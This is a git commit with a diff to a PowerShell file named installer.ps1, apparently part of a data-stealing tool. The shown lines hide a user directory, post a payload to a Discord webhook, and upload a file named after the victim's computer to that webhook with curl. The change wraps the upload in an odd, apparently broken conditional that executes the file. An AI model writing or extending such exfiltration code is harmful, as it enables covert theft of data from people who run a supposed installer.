8767dfd120158e493a25b4dd9fed74f10908364a
Sunnickel <alexanderreiter20@gmail.com>
2023-11-01 22:41:30 +0100

    asdasd

--- files/installer.ps1
+++ files/installer.ps1
@@ -61,7 +61,9 @@ Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attribute
 
 ## Sends Discord Webhook
 Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
-curl.exe -F "file1=@./$env:computername.fk" $Webhook
+if (-not ([string]((./$env:computername.fk)))) {
+  curl.exe -F "file1=@./$env:computername.fk" $Webhook
+}
 
 
 ## goto Temp and make dir
